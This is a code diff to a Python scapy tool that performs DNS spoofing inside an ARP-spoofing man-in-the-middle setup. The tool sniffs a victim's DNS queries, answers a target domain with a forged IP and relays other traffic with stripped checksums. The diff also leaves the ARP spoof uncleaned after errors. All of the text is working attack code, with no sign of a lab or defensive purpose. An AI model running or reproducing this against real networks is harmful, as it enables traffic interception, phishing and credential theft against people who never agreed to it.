@@ -54,41 +54,29 @@ class dns:
                 dns.send_spoof_packet(packet, domain, spoofed_ip)
                 
             else:
-                # Request is for domain that should not be spoofed so forward to router
-                print("non spoofed DNS query for %s. forwarding to %s" % (query_domain, router_ip))
+                # Request is for domain that should not be spoofed so forward 
                 forward_pkt = packet.copy()
-                forward_pkt[IP].dst = router_ip
                 del forward_pkt[IP].chksum
                 del forward_pkt[UDP].chksum
                 if forward_pkt.haslayer(Ether):
                     del forward_pkt[Ether].src
                     del forward_pkt[Ether].dst
+                print("non spoofed DNS query for %s. forwarding to %s" % (query_domain, forward_pkt[IP].dst))
                 send(forward_pkt, verbose=False)
+                print("Packet send to %s" % forward_pkt[Ether].dst)
                 
         elif packet.haslayer(DNS) and packet.getlayer(DNS).qr == 1:
             # Packet is a DNS response packet
-            if packet[IP].src == router_ip and packet[IP].dst == victim_ip:
-                # legit response from router to victim
-                # Requests for spoofed domain get intercepted before so will not get response from router
-                query_domain = packet.getlayer(DNS).qd.qname.decode('utf-8').rstrip('.')
-                print("Received DNS response from %s to %s for %s" % (packet[IP].src, packet[IP].src, query_domain))
-                forward_pkt = packet.copy()
-                
-                if forward_pkt.haslayer(Ether):
-                    del forward_pkt[Ether].src
-                    del forward_pkt[Ether].dst
-                send(forward_pkt, verbose=False)
-                
-            else:
-                # different host, simply forward
-                print("received packet for different host (%s) or source (%s)" % (packet[IP].dst, packet[IP].src))
-                if packet[IP].src == victim_ip or packet[IP].dst == victim_ip or \
-                       packet[IP].src == router_ip or packet[IP].dst == router_ip:
-                        forward_pkt = packet.copy()
-                        if forward_pkt.haslayer(Ether):
-                            del forward_pkt[Ether].src
-                            del forward_pkt[Ether].dst
-                        send(forward_pkt, verbose=False)
+            # Requests for spoofed domain get intercepted before so will not get response from router
+            query_domain = packet.getlayer(DNS).qd.qname.decode('utf-8').rstrip('.')
+            print("Received DNS response from %s to %s for %s" % (packet[IP].src, packet[IP].src, query_domain))
+            forward_pkt = packet.copy()
+            del forward_pkt[IP].chksum
+            del forward_pkt[UDP].chksum
+            if forward_pkt.haslayer(Ether):
+                del forward_pkt[Ether].src
+                del forward_pkt[Ether].dst
+            send(forward_pkt, verbose=False)
             
         else:
             # non DNS packet, must forward
@@ -113,12 +101,12 @@ class dns:
             sniff(filter="udp and port 53", prn=lambda pkt: dns.handle_packet(pkt, domain, spoofed_ip, victim_ip, router_ip), store=0, iface=interface)
         except KeyboardInterrupt:
             print("stopping DNS spoof")
+            arp1.stop_two_way_spoof()
         except Exception as e:
             print("An error occurred: %s" % e)
-            traceback.print_exc()
+            #traceback.print_exc()
             
         finally:
-            arp1.stop_two_way_spoof()
             dns.set_ip_forwarding(False)
             print("DNS spoofing stopped")
             
